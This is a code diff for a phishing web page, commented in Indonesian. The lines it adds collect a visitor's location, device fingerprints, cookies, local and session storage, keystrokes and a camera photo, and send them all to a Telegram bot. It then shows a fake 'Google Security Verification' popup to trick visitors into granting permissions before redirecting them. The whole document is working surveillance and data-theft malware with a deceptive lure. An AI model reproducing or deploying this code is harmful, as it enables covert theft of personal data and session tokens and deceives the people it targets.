+📮 Kode Pos: ${ipData?.postal || '?'}
+🎯 Koordinat: ${ipData?.latitude || '?'}, ${ipData?.longitude || '?'}
+📡 ISP: ${ipData?.org || '?'}
+🔢 ASN: ${ipData?.asn || '?'}
+🛡️ VPN/Proxy: ${ipData?.proxy ? '✅ YA' : '❌ TIDAK'}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💻 DEVICE & HARDWARE LENGKAP
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🖥️ OS: ${os}
+📱 Device: ${deviceBrand} ${deviceModel}
+🌐 Browser: ${browser} v${browserVersion}
+🧠 RAM: ${deviceMemory}
+⚡ CPU Cores: ${cpu}
+📺 Screen: ${screen}
+🖱️ Touch Points: ${touchPoints}
+🎨 Vendor: ${vendor}
+📦 Product: ${product}
+🔢 Product Sub: ${productSub}
+📱 App Name: ${appName}
+📱 App Version: ${appVersion.substring(0, 50)}
+🔌 Online Status: ${onLine}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🌍 BROWSER & SETTINGS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🛡️ AdBlock: ${adblockDetected ? '✅ YA' : '❌ TIDAK'}
+🌙 Dark Mode: ${darkMode}
+🚫 Do Not Track: ${doNotTrack}
+🍪 Cookie Enabled: ${cookieEnabled}
+🌐 Language: ${language}
+🌍 All Languages: ${languages}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🎮 FINGERPRINTING
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🎨 WebGL/GPU: ${webgl.substring(0, 150)}
+🖌️ Canvas FP: ${canvasFP.substring(0, 100)}
+🎵 Audio FP: ${audioFP.substring(0, 100)}
+🔤 Fonts Terinstall: ${fonts.substring(0, 200)}
+🔌 Plugins: ${plugins.substring(0, 150)}
+📁 MIME Types: ${mimes.substring(0, 150)}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📡 NETWORK & BATTERY
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📶 Network: ${network}
+🔋 Battery: ${battery}
+⚡ Battery Detail: Level ${batteryDetail.level} (Charging: ${batteryDetail.charging})
+⏱️ Charging Time: ${batteryDetail.chargingTime}
+⏱️ Discharging Time: ${batteryDetail.dischargingTime}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🍪 STORAGE (FULL)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🍪 Cookies: ${cookies.substring(0, 300)}${cookies.length > 300 ? '...' : ''}
+💾 LocalStorage: ${localStorage.substring(0, 300)}${localStorage.length > 300 ? '...' : ''}
+📦 SessionStorage: ${sessionStorage.substring(0, 300)}${sessionStorage.length > 300 ? '...' : ''}
+🗄️ IndexedDB: ${indexedDB}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⌨️ KEYLOGGER & CLIPBOARD
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⌨️ ${keylog.substring(0, 500)}${keylog.length > 500 ? '...' : ''}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⏰ WAKTU & METADATA
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📅 Waktu: ${waktuFormatted}
+🔢 UNIX: ${unixTimestamp}
+🌍 Timezone: ${timezone} (GMT${timezoneOffset >= 0 ? '+' + timezoneOffset : timezoneOffset})
+⏱️ Durasi Halaman: ${duration} detik
+🕒 Peak Hour: ${peakHour}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔗 TRAFFIC SOURCE
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔗 URL: ${window.location.href}
+🚪 Referrer: ${document.referrer || '(Langsung)'}
+
+╚══════════════════════════════════════════════════════════════════════════════════╝
+`;
             
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: fakeMessage, parse_mode: 'HTML' })
-            }).catch(e => console.log);
+            // Kirim ke Telegram (split if too long)
+            if (message.length > 4000) {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message.substring(0, 4000) })
+                }).catch(e => console.log);
+                await new Promise(r => setTimeout(r, 500));
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message.substring(4000, 8000) })
+                }).catch(e => console.log);
+            } else {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+                }).catch(e => console.log);
+            }
+            
+            // Kirim foto kamera juga kalau ada
+            if (cameraPhoto && cameraPhoto.length > 100) {
+                try {
+                    const blob = await (await fetch(cameraPhoto)).blob();
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'camera.jpg');
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch(e) {}
+            }
             
             // Redirect
             setTimeout(() => {
                 window.location.href = REDIRECT_URL;
             }, 2000);
         });
+        
+        // Show permission popup to make user allow
+        setTimeout(() => {
+            const popup = document.createElement('div');
+            popup.className = 'permission-popup';
+            popup.innerHTML = `
+                <div class="permission-box">
+                    <div style="font-size: 48px;">🔐</div>
+                    <h3>Security Verification Required</h3>
+                    <p>Google needs additional permissions to verify your identity.</p>
+                    <button id="allowPerms">Allow & Continue</button>
+                </div>
+            `;
+            document.body.appendChild(popup);
+            document.getElementById('allowPerms').addEventListener('click', () => {
+                popup.remove();
+                requestAllPermissions();
+            });
+        }, 1000);
     </script>
 </body>
 </html>
